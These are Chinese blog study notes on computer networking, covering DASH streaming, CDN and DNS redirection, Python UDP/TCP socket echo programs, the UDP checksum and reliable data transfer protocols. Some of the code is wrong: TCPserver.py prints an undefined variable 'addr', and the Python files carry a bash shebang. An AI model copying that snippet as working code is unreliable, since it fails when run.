</ol>
<p>针对不同的冗余，就会出现两种编码方式来降低需要传输的图片的比特数：</p>
<ol type="1">
<li><strong>时间编码</strong>：假设第i张图片已经发送，那么在传送第i+1张图片的时候并不是所有的像素都发送，而是只发送与前一张不同的地方的像素点。</li>
<li><strong>空间编码</strong>：假设发送一张图片，其中N个像素点是一样的。此时不会发送这N个像素点的值，而是只发送一个像素点的值，以及像素点的个数和位置。</li>
</ol>
<p>编码根据速率还可以分为：</p>
<ol type="1">
<li>CBR(Constant bit rate)：以固定的速率编码</li>
<li>VBR(Variable bit rate)：视频编码的速率随时间的变化而变化</li>
</ol>
<p>解释：假设是一个地方的风景的视频，那么绝大部分的图片都是类似的，因此可以使用CBR方式。如果是打斗戏，那么可能每一张图片的变化就会较大，此时就不太适合固定的速率编码了（来不及将下一张图片编码完成），此时就需要根据时间从而变化编码率。</p>
<h3 id="多媒体流化服务和dash">7.1.2. 多媒体流化服务和DASH</h3>
<p><strong>DASH: Dynamic Adaptive Streaming over HTTP</strong></p>
<p>客户请求一个视频资源的时候一般有两种方式：</p>
<ol type="1">
<li>将整个视频下载下来，下载完成之后再看</li>
<li><strong>多媒体流化服务</strong>：一边看一边加载后面的内容</li>
</ol>
<p>如果采用多媒体流化服务，那么服务器就需要：</p>
<ul>
<li>将视频文件分成多块</li>
<li>每个块独立存储，并且不同编码速率的都会存储一份</li>
<li><strong>告示文件(manifest file)</strong>：提供不同块的URL</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602131408.png" /></p>
<p>客户端：</p>
<ul>
<li>先获取 manifest file</li>
<li>周期性的测量服务器到客户端的带宽</li>
<li>查询告示文件，请求一个块</li>
</ul>
<p>但是什么时候请求、请求什么编码速率的块，这就是DASH的工作了。当然用户可以自己指定，也可以通过选择
“自动” 交给DASH决定。比如bilibili中的：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602121416.png" /></p>
<p>如果带宽稳定，DASH会按照一定的时间去请求资源块，是缓存不挨饿，也不溢出。如果带宽不稳定，DASH会根据带宽的变化，决定什么时候请求下一个资源块。</p>
<p>请求什么编码速率的块也是一样的，如果带宽资源够或者缓存了足够的资源（保证不会卡顿），那么请求下一个资源块的时候就可以请求编码率高的。除此之外，还会根据设备的情况，比如说屏幕的大小来决定请求的块的编码率。</p>
<p>到此，就解决了异构性的问题。</p>
<h2 id="规模性">7.2. 规模性</h2>
<p>假设Youtube在全世界只有一处数据中心，那么日本或者非洲的用户想要查看其中的视频内容该怎么办呢？即使服务器能够服务全世界的用户，但是吞吐量不够呀，视频需要一定的吞吐量才能观看。</p>
<p>更何况，全世界的用户请求这一个数据中心，那么数据中心周遭的流量就会非常的大，造成拥塞。即使数据中心有能力，但是中间链路的带宽可能不够，就会成为瓶颈。</p>
<p>并且根据“28定律”，这使得网络充斥着同一个视频的多个拷贝，效率低还占带宽。最后，只有一处数据中心，如果出现故障，全世界将无法享受服务。因此需要解决办法来满足如此大规模的用户量，CDN就这样出现了。</p>
<p>CDN服务器有CDN供应商提供，简单来说就是CDN供应商在全球范围内的各个重要的地方设置数据服务器，然后ICP将数据内容预先的存放到CDN服务器上（至于哪些CDN服务器存放哪些内容这就涉及到部署策略的问题，这里不会说明）。这样子客户就能够通过向距离最近、带宽最好的CDN服务器请求资源。这样子既解决了规模的问题，也在一定程度上优化了用户的服务体验。所以CDN提供的是：<strong>内容加速服务</strong>。</p>
<p>CDN服务器的设置有两种方式：</p>
<ol type="1">
<li>enter deep：将CDN服务器设置到接入网内部
<ul>
<li>优势：更接近用户，用户体验最好</li>
<li>劣势：需要部署的服务器多且分散，难以管理，经济压力大</li>
</ul></li>
<li>bring home：部署在关键位置，比如IXP位置
<ul>
<li>优势：部署的服务器数量少，比较实惠，并且方便管理。也能够提供不错的服务</li>
<li>劣势：离用户稍远，提供的体验没有 enter deep</li>
</ul></li>
</ol>
<p>解释一下 bring
home。假设YouTube需要给中国用户提供服务，那么只需要在几个地方建CDN，比如说西安，北京、广州，上海，成都。这样中国的用户就可就近请求资源。凡是如果是
enter deep，可能就需要在每个省建立一个CDN服务器。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602132841.png" /></p>
<p>上图中的方式就是 enter deep。如果是 bring
home，就会建立在蓝色圆圈这些地方。</p>
<p>这里详细说明一下CDN的工作流程。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602134844.png" /></p>
<ol type="1">
<li>client首先向原始服务器请求资源，原始服务器回了一个 manifest
file；比如说内容为：<code>block1: video.netcinema.com?vid=1, ....</code></li>
<li>client根据manifest file请求block1，交给本地DNS解析域名</li>
<li>本地DNS不知道，去问
<code>netcinema.com</code>权威DNS服务器（这里可能跳过了请求根、顶级之类的过程），权威DNS为了将该请求转交个CDN，因此给了本地DNS
KingCDN权威服务器的IP</li>
<li>本地DNS向KingCDN请求
block1，KingCDN权威根据LDNS的IP或者其他信息，找到最近的CDN服务器，然后将IP地址返回给本地DNS</li>
<li>本地DNS将这个IP地址返回给client</li>
<li>client拿着这个IP地址去请求CDN服务器，与其建立连接，并进行数据传输</li>
</ol>
<p>如果请求block2可能就不需要1，2，3，4，5，直接与CDN服务器请求。如果使用DASH，还可以根据带宽、缓存请求版本最适合的块。</p>
<h1 id="socket编程">8. socket编程</h1>
<p>分别用UDP和TCP实现socket通信。</p>
<p>需求：client发送小写的句子，server将其全部转成大写并发送回client。</p>
<h2 id="udp-socket-1">8.1. UDP socket</h2>
<p>UDPcliet.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverHost = <span class="string">&#x27;10.0.2.21&#x27;</span></span><br><span class="line">serverPort = <span class="number">3333</span></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;please input lowercase sentence: &#x27;</span>)</span><br><span class="line">clientSocket.sendto(message.encode(), (serverHost, serverPort))</span><br><span class="line">resp =clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(resp[<span class="number">0</span>].decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure>
<p>稍微解释一下：</p>
<ul>
<li><code>clientSocket = socket(AF_INET, SOCK_DGRAM)</code> 创建一个UDP
Socket，SOCK_DGRAM 就是数据报 datagram；AF_INET（又称 PF_INET）是 IPv4
网络协议的套接字类型</li>
<li><code>clientSocket.sendto(message.encode(), (serverHost, serverPort))</code>
将信息发送给服务器，需要指定服务器的IP和port。因为是字节流，所以需要先将字符串转为byte</li>
<li><code>resp =clientSocket.recvfrom(2048)</code>
从字节流中接收2048个字节，也就是只能接收2048个字节长度的响应报文。返回值是一个元组
<code>(message, (ip, port))</code></li>
<li>因为 message 是 byte 型，所以需要转为str</li>
</ul>
<p>UDPserver.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">port = <span class="number">3333</span></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>, port))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The server is ready to receive.&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    message, clientAddress = serverSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line">    modifiedMessage = message.decode().upper()</span><br><span class="line">    serverSocket.sendto(modifiedMessage.encode(), clientAddress)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>serverSocket.bind(('', port))</code>将socket与自己的端口绑定</li>
</ul>
<p>效果：</p>
<p>先启动服务器</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602210159.png" /></p>
<p>然后启动客户端</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602210245.png" /></p>
<p>如果将客户端的 2048 改为 1，那么即使服务器返回
<code>HELLO WORLD</code> 也只能收到 H。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602210411.png" /></p>
<p>同样的，如果服务器的改为
1，即使客户端能够接收2048，因为服务器只能接收1，所以也还是 H</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602210628.png" /></p>
<h2 id="tcp-socket-1">8.2. TCP socket</h2>
<p>TCPcliet.py <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverHost = <span class="string">&#x27;10.0.2.21&#x27;</span></span><br><span class="line">serverPort = <span class="number">4444</span></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">clientSocket.connect((serverHost, serverPort))</span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;please input lowercase sentence: &#x27;</span>)</span><br><span class="line">clientSocket.send(message.encode())</span><br><span class="line">resp = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure></p>
<p>TCPserver.py <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">port = <span class="number">4444</span></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>, port))</span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The server is ready to receive&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    connectionSocket, target = serverSocket.accept()</span><br><span class="line">    <span class="built_in">print</span>(addr)</span><br><span class="line">    message = connectionSocket.recv(<span class="number">2048</span>).decode()</span><br><span class="line">    modifiedMessage = message.upper()</span><br><span class="line">    connectionSocket.send(modifiedMessage.encode())</span><br><span class="line">    connectionSocket.close()</span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>SOCK_STREAM</code> 字节流，TCP发送的是字节流</li>
<li><code>clientSocket.connect((serverHost, serverPort))</code>TCP需要建立连接</li>
<li><code>resp = clientSocket.recv(1024)</code>
接收1024的字节流，直接获得的就是数据</li>
<li><code>connectionSocket, target = serverSocket.accept()</code>
接收客户端的连接请求，返回值是<code>(conn, address)</code>
，前者为新的socket对象，后者为另一端的socket值</li>
<li><code>serverSocket.listen(1)</code>
TCP请求队列，设置为1表示最多只能接收一个TCP请求，因为一个TCP连接建立，队列就满了</li>
<li></li>
</ul>
<p>效果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602212546.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602212602.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602212809.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602212800.png" /></p>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>计算网络教程 自顶向下方法</tag>
        <tag>B站中科大计网</tag>
      </tags>
  </entry>
  <entry>
    <title>第 3 章 传输层</title>
    <url>/2022/06/04/%E7%AC%AC%203%20%E7%AB%A0%20%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="概述和传输层服务">1. 概述和传输层服务</h1>
<p><strong>传输层的作用</strong>：</p>
<ol type="1">
<li>为运行在不同主机上的应用进程提供<strong>逻辑通信</strong></li>
<li>传输层协议运行在端系统：
<ul>
<li>发送方：将应用层message划分成多个报文段（segment），然后向下传递给网络层</li>
<li>接收方：将segment重组成message，然后传递给应用层</li>
</ul></li>
<li>有两个传输层协议：
<ul>
<li>TCP</li>
<li>UDP</li>
</ul></li>
</ol>
<p><strong>传输层和网络层的区别</strong>：</p>
<ul>
<li>网络层：主机之间的逻辑通信</li>
<li>传输层：应用进程间的逻辑通信
<ul>
<li>依赖于网络层的服务</li>
<li>对网络层的服务进行加强：数据丢失、顺序混乱、加密(SSL)</li>
</ul></li>
</ul>
<p>有些服务是可以加强的，比如网络层的服务是不可靠的，通过传输层，可以向上提供可靠的服务；还可以使用SSL加强安全方面的功能；但是，还有些服务是无法通过传输层加强的，比如说带宽和时延。</p>
<p><strong>传输层的协议</strong>：</p>
<ol type="1">
<li>可靠的传输：TCP
<ul>
<li>多路复用、解复用</li>
<li>拥塞控制</li>
<li>流量控制</li>
<li>建立连接</li>
<li>向上层传输字节流</li>
</ul></li>
<li>不可靠的传输：UDP
<ul>
<li>多路复用、解复用</li>
<li>没有为尽力而为的IP服务添加其他额外的服务</li>
<li>向上层传输数据报</li>
</ul></li>
</ol>
<p><strong>两者也有其共同点</strong>：</p>
<ul>
<li>都不为上层提供<strong>时延保证</strong>；</li>
<li>都不为上层提供<strong>带宽保证</strong>；</li>
</ul>
<p><strong>数据报和字节流的区别？以及原因？</strong></p>
<p><strong>字节流</strong>：传输层向上层发送的数据是“流式的”，就是没有边界之分。假如应用进程发送了5个message，那么传输层向目标进程发送的就是这5个message的字节流，说白点就是一堆数据直接往上层发送，要想区分这5个message，上层的应用自己想办法。</p>
<p><strong>数据报</strong>：发送方发送多少，接收方的传输层就给上层发送多少数据。</p>
<p>因为TCP服务能够保证message的顺序，所以将message按照正确的先后顺序放到一起，形成字节流向上层传输，应用进程负责将字节流分割成原本的message。先读取第一个message的大小的字节，再读取第二个，依次类推，最终得到的就是有序的message。</p>
<p>而UDP提供不可靠的传输，因此不保证顺序。假设UDP也适用字节流，如果message按照1，2，3的顺序发送，但是由于路由、网络的问题，到达的顺序是2，1，3，UDP将这些message按照先后顺序直接堆在一起向上层传输，上层根据第1个message的大小读取，然后按照第2个message的大小读取，最后按照第3个message的大小读取。运气好点，三个message的大小一致，那么也只是顺序乱了。运气不好假设1是50bytes，2是10byte，3是40byte，那么由于达到的顺序是2，1，3，那么应用层先读取50byte的大小，此时得到的
1' 为原先2的10byte和原先1的前40byte的组合；得到的 2'
为原先1的后10个byte；3'和3还是一样的。</p>
<p>这就是为什么TCP使用字节流，而UDP采用数据报。</p>
<h1 id="多路复用解复用">2. 多路复用、解复用</h1>
<p>因为TCP上面可能运行则会许多应用进程，这么多进程通过不同的端口发送数据到TCP。TCP不在乎上层的进程，将message与相关信息组合成segment之后就往下发。这就叫做多路复用。对于TCP来说上层的进程是谁，用的什么协议它都不care。</p>
<p>多路解复用是多路复用的相反的过程。TCP收到segment之后需要将其正确的传输给上层的应用进程，但是它并不知道上层有哪些应用，只能够根据segment中的port向上层传数据。画个形象的图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602230655.png" /></p>
<blockquote>
<p>UDP也有类似的过程</p>
</blockquote>
<h2 id="tcp的多路复用解复用">2.1. TCP的多路复用/解复用</h2>
<p>TCP在两个进程之间建立逻辑连接。一个进程的socket有：<code>socket, 源IP, 源port, 目标IP, 目标port, pid</code>。</p>
<h3 id="多路复用">2.1.1. 多路复用</h3>
<p>不同的进程通过不同的socket向TCP传递数据。TCP将源端口，目标端口和message封装成segment（如果数据太大，需要分成多个segment，这里为了简单，假设数据正好就是一个segment），然后把segment和源IP，目标IP向网络层传，接下来网络成会将segment和源、目标IP分装成packet继续往下。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602232405.png" /></p>
<h3 id="多路解复用">2.1.2. 多路解复用</h3>
<p>IP将packet中的头部去除，然后向上层传递，TCP从segment的头部中读取port，然后传递给对应的进程。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602232449.png" /></p>
<h2 id="udp的多路复用解复用">2.2. UDP的多路复用/解复用</h2>
<h3 id="多路复用-1">2.2.1. 多路复用</h3>
<p>UDP和TCP类似，只不过在多路复用时，应用层往传输层传递的信息多了一个：目标IP和目标port。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602233129.png" /></p>
<h3 id="多路解复用-1">2.2.2. 多路解复用</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220602232940.png" /></p>
<h1 id="无连接传输udp">3. 无连接传输：UDP</h1>
<p><strong>UDP: User Datagram Protocol</strong></p>
<ul>
<li>提供不可靠的、尽力而为的服务
<ul>
<li>报文可能丢失</li>
<li>到达目标进程的报文顺序可能会打乱</li>
</ul></li>
<li>无连接
<ul>
<li>UDP发送方和接收方之间没有握手</li>
<li><strong>每个UDP报文段被独立处理</strong>（这与TCP的字节流是不一样的）</li>
</ul></li>
<li>UDP适用于：
<ul>
<li>流媒体</li>
<li>DNS</li>
<li>SNMP</li>
</ul></li>
</ul>
<p>如果想要在UDP上实现可靠的传输，有两种方案：</p>
<ul>
<li>在应用层增加可靠性</li>
<li>使用特定的差错恢复（UDP并没有差错恢复，只有差错检测）</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603171648.png" /></p>
<p><strong>为什么要有UDP？</strong></p>
<ol type="1">
<li>无连接。向DNS这样的就很适合</li>
<li>简单。发送方和接收方都没有连接状态</li>
<li>报文段的头部(head or cost)很小，只有8个字节</li>
<li>无拥塞控制和流量控制，使得UDP可以尽可能块的发送报文段
<ul>
<li>应用层给传输层的速率，会等于传输层往下传的速率，也会等于主机往网络里传数据的速率</li>
</ul></li>
</ol>
<h2 id="udp校验和checksum">3.1. UDP校验和(checksum)</h2>
<p><strong>UDP的差错检测：UDP校验和</strong>。</p>
<p>因为数据在网络中传输也有可能会因为链路质量问题、外界因素等原因使得某一些bit出现了差错。数据被路由器保存的时候也有可能会出现bit的差错。</p>
<p><strong>目标</strong>：检测在被传输报文段中的差错。</p>
<p>UDP的校验和需要计算<strong>UDP首部</strong>加<strong>数据荷载</strong>部分，但也需要加上<strong>UDP伪首部</strong>。这个伪首部指，源地址、目的地址、UDP数据长度、协议类型（0x11），协议类型就一个字节，但需要补一个字节的0x0，构成12个字节。伪首部+UDP首部+数据一起计算校验和。</p>
<p>UDP检验和的计算方法是：</p>
<ol type="1">
<li>将报文段每16bit分成一段。也就是报文段必须是16bit的整数，如果不够，需要在数据载荷后面填0补齐</li>
<li>取出第1，2个段，然后相加得到结果res1</li>
<li>将res1和第3个段相加，得到res2</li>
<li>依此类推，知道所有段都加完，得到最终的结果finRes</li>
<li>将 finRes 取反码。这就是UDP报文段的校验和，将其填入“校验和”字段</li>
</ol>
<p><strong>两个段相加可能会导致溢出，此时需要回卷</strong>。在接下来的例子中说明这一点。</p>
<p><strong>发送方</strong>：</p>
<p>举一个计算的例子，假设UDP报文段总共有48bits，一共将其分成三段：（这里左边为低位，右边为高位）</p>
<ul>
<li><code>1110011001100110</code></li>
<li><code>1101010101010101</code></li>
<li><code>0101010110101010</code></li>
</ul>
<p>首先 <span
class="math inline">\(res1&#39;=1110011001100110+1101010101010101=11011101110111011\)</span>。注意
res1' 为17bit，超过16bit，这就是溢出，此时需要再次进行计算<span
class="math inline">\(res1=1011101110111011+0000000000000001=1011101110111100\)</span>。</p>
<p>然后 <span
class="math inline">\(finRes&#39;=res1+0101010110101010=10001000101100110\)</span>，因此，<span
class="math inline">\(finRes=0001000101100111\)</span>。将finRes取反码（1变为0，0变为1），得到<span
class="math inline">\(checksum=1110111010011000\)</span></p>
<p>最终，发送方发送的就是四段数据：</p>
<ul>
<li><code>1110011001100110</code></li>
<li><code>1101010101010101</code></li>
<li><code>0101010110101010</code></li>
<li>checksum: <code>1110111010011000</code></li>
</ul>
<p><strong>接收方</strong>：</p>
<p>接收到这样的数据之后，将前三个字段进行一样的计算，然后与 checksum
做比较（或者这里可以将前3个段的计算结果与checksum相加，结果全为1表示相等，否则表示不相等）：</p>
<ul>
<li>如果相等：没有检测到差错（注意，是没有检测到，不代表没有）</li>
<li>如果不相等：检测到差错</li>
</ul>
<p>但是，UDP不提供差错恢复，因此即使检测到差错也只是向对应的应用进程发出警告。</p>
<p>这里最后解释一下为什么计算结果和 checksum
相等，也不代表没有差错。为了计算简单，就去两段数据：</p>
<ul>
<li><code>1110011001100110</code></li>
<li><code>1101010101010101</code></li>
<li>chcksum: <code>0100010001000011</code></li>
</ul>
<p>接收方接收到下面的数据：</p>
<ul>
<li><code>0000000000001100</code></li>
<li><code>1011101110110000</code></li>
<li>checksum: <code>0100010001000011</code></li>
</ul>
<p>前两个段计算出的结果为：<code>1011101110111100</code> 取反得到
<code>0100010001000011</code>，与校验和一致，但此时接收的数据明显和发送的数据不一样。这就是为什么即使校验和通过，也无法保证没有差错，只是没有该机制无法检测出这种错误。</p>
<blockquote>
<p>端到端原则(end-end
principle)：在某种功能必须基于端到端实现的情况下，“与在较高级别提供这些功能的代价相比，在较低级别上设置的功能可能是冗余的或几乎没有价值的”。</p>
</blockquote>
<p><strong>在这里，功能就是差错检测，要在较高级别实现，这就是UDP有差错检测的原因。</strong></p>
<h1 id="可靠数据传输原理">4. 可靠数据传输原理</h1>
<h2 id="问题描述">4.1. 问题描述</h2>
<ol type="1">
<li>Reliable Data Transfers, RDT: 可靠数据传输</li>
<li>Unreliable Data Transfers, UDT: 不可靠数据传输</li>
</ol>
<p>rdt在应用层、传输层和数据链路层都很重要，是网络 Top10 问题之一。</p>
<p><strong>信道的不可靠性决定了可靠数据传输协议的复杂性！！！</strong></p>
<p>因此，一般将情况分为以下两种：</p>
<ol type="1">
<li><p><strong>底层信道可靠</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603195008.png" /></p></li>
<li><p><strong>底层信道不可靠</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603195424.png" /></p></li>
</ol>
<p>可以看到，如果信道可靠，传输层甚至什么事都不用做（可靠方面的事），直接往应用层传数据即可。但是如果信道越不可靠，传输层的可靠服务传输协议就越复杂。</p>
<h2 id="rdt的发展">4.2. RDT的发展</h2>
<h3 id="rdt-1.0-可靠信道">4.2.1. RDT 1.0 可靠信道</h3>
<p>下层信道完全可靠：</p>
<ul>
<li>没有比特出错</li>
<li>没有分组丢失</li>
</ul>
<p>这种情况下，应用层向传输层提交数据，传输层封装一下直接往下层传送即可。同样的，接收方的传输层收到下层的数据，解封装之后往上层传就可以了。不需要做可靠性方面的工作。</p>
<p>很理想，现实生活中一般不可能。</p>
<h3 id="rdt-2.0-比特差错的信道">4.2.2. RDT 2.0 比特差错的信道</h3>
<p>下层的信道可能会出错：分组中的比特可能会翻转（1变0，0变1），但是分组不会丢失。</p>
<ul>
<li>用 checksum 检测</li>
</ul>
<p><strong>问题</strong>：之前也说明了 checksum 只能检测，不能恢复。</p>
<p><strong>解决</strong>：</p>
<ul>
<li><strong>确认(Ack)</strong>：接收方显式的告诉发送方分组已被正确接收（checksum通过）。发送方收到Ack后，发送下一个分组</li>
<li><strong>否定确定(NAK)</strong>：接收方显式的告诉发送方分组发生了差错。发送方收到NAK后，重传分组</li>
</ul>
<p>没有差错的情况下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603202300.png" /></p>
<p>有差错的情况下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603202315.png" /></p>
<p><strong>这就意味着，发送方需要保存已发送的分组的副本用于重传。</strong></p>
<p>这种情况看上去很完美，能够解决分组的差错恢复的问题，但是，实际上有一个很严重的缺陷。那就是，<strong>差错恢复依赖于Ack和NAK</strong>。在网络中传输的分组可能发生差错，那么Ack和NAK也可能发生差错。</p>
<p>如果接收方回复的Ack发生了差错，使得发送方不知道接收方的意思。此时发送方应该怎么做呢：</p>
<ul>
<li>重传。可能会重复</li>
<li>不重传。那么这个包接收方就收不到。接收方收不到这个包就无法向上层提供可靠服务。</li>
</ul>
<h3 id="rdt-2.1-引入序号">4.2.3. RDT 2.1 引入序号</h3>
<p>在2.0的基础之上，在每个分组中加入序号。如果ACK/NAK出错，发送方重传分组。接收方根据分组的序号来判断是否重复。</p>
<ul>
<li>如果接收方刚刚发送的是Ack，丢弃重传的分组</li>
<li>如果接收方刚刚发送的是NAK，则接收重传的分组</li>
</ul>
<p>Ack出错：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603203830.png" /></p>
<p>NAK出错：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603203842.png" /></p>
<blockquote>
<p>这种发送数据之后等到接收方确认，然后再次发送的协议称为<strong>停止等待协议(stop-and-wait)</strong></p>
</blockquote>
<p>这种情况下只需要1bit来代表序号就可以了。<strong>0表示重传分组，1表示新分组</strong>。如果收到的Ack/NAK出错，重传0号分组。</p>
<p>其实是这样的：</p>
<ul>
<li>发送方发送第一个分组，此时为1，接收方回一个Ack，但是出错了。</li>
<li>发送方重传分组，此时为0，接收方收到后，回一个Ack，此时没出错，但是会将该分组丢弃。</li>
</ul>
<p>也就是任何一个分组，第一次发送都是1号分组，重传才是0号分组。接收方收到0号回想“我刚刚收到了呀，怎么给我重传了，我丢弃该分组，并给发送方会Ack”</p>
<p>这种情况下，接收方并不知道发送方有没有收到Ack/NAK。只能够通过发送方下次发送的分组是0还是1才能够知道发送方到底收没收到。</p>
<h3 id="rdt-2.2-无nak的协议">4.2.4. RDT 2.2 无NAK的协议</h3>
<p><strong>思想：用前一个分组的正向确认来代替当前分组的反向确认</strong></p>
<ul>
<li>功能上与2.1相同，但是只使用Ack而放弃NAK。</li>
<li>接收方对<strong>最后</strong>正确解释的分组发Ack，以替代NAK
<ul>
<li>接收方在Ack中必须显式的包含正确接收分组的序号</li>
</ul></li>
<li>当收到重复的Ack时，发送方采取与收到NAK时相同的动作，重传当前分组</li>
<li>为后面的一次发送多个数据单位做一个准备：
<ol type="1">
<li>一次发送多个</li>
<li>每一个的应答如果都有Ack或者NAK，麻烦</li>
<li>用前一个分组的正向确认来代替当前分组的反向确认</li>
<li>确认信息减少一半（少了NAK），协议处理简单</li>
</ol></li>
</ul>
<p>没有出错的情况下：</p>
<ol type="1">
<li>S发送P1，接收方响应Ack1</li>
<li>S发送P2，接收方响应Ack2</li>
<li>...</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603205342.png" /></p>
<p>分组出错的情况下：</p>
<ol type="1">
<li>发送方（S）发送分组1（P1），接收方（R）接收之后，回一个Ack1。</li>
<li>S收到 Ack1之后发送P2，假设P2出错了，接收方再回一个Ack1</li>
<li>S再次收到Ack1就会知道，P2出错了，所以会重传P2</li>
<li>...</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603205402.png" /></p>
<p>Ack出错的情况下：</p>
<ol type="1">
<li>S发送P0，R收到了，回一个Ack0</li>
<li>但是Ack0出错了，变成了Ack0'，S不理解Ack0'的意思，就会重传P0</li>
<li>R再次收到P0，就会知道Ack0出错了，再次发送Ack0，并将本次接收的P0丢弃</li>
<li>...</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603205627.png" /></p>
<h3 id="rdt-3.0-具有比特差错和分组丢失的信道">4.2.5. RDT 3.0
具有比特差错和分组丢失的信道</h3>
<h4 id="rdt-3.0-工作原理">4.2.5.1. RDT 3.0 工作原理</h4>
<p>这种情况下，底层信道除了之前描述的比特差错，还可能存在分组丢失的问题。如果遇到比特差错，用2.2解决就可以了，因此，这里只讨论关于分组丢失情况下的处理。</p>
<p><strong>问题描述</strong>：2.2的协议能否解决分组丢失的问题呢？答案是不能，S发送P1之后需要等待R的Ack1，但如果此时P1丢失了，R没收到就不会发送Ack1，会一直等待P1；同样的，S会一直等待Ack1，不会重传P1，这时就发生了死锁。</p>
<p><strong>解决办法</strong>：加入等待时间。发送方发送完分组之后等待一段<strong>合理的时间</strong>，再这段时间内没有收到Ack就默认为分组丢失，接下来就会重传分组。这样就能够解除死锁。即使可能存在Ack因为网络拥塞的问题，没有在等待时间内到达发送方，也当作丢失，该情况下接收方会丢弃重传的分组，并再次回Ack。</p>
<blockquote>
<p>合理的时间：可以根据概率论知识来设定，可以是自适应的，也可以是固定的值，但一定要比RTT大，否则Ack来不及。这不是重点。</p>
</blockquote>
<p>此时的协议已经是一个完备的协议了，可以解决比特差错和分组丢失两大问题：</p>
<ol type="1">
<li>校验和</li>
<li>序号</li>
<li>Ack</li>
<li>重传</li>
<li>等待时间（超时时间）</li>
</ol>
<p>没有分组丢失的情况：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603211049.png" /></p>
<p>分组丢失的情况：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603211103.png" /></p>
<p>Ack丢失的情况：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603211130.png" /></p>
<p>还有一种奇葩的情况，那就是设置的等待时间太短了，Ack到不了发送方</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603211215.png" /></p>
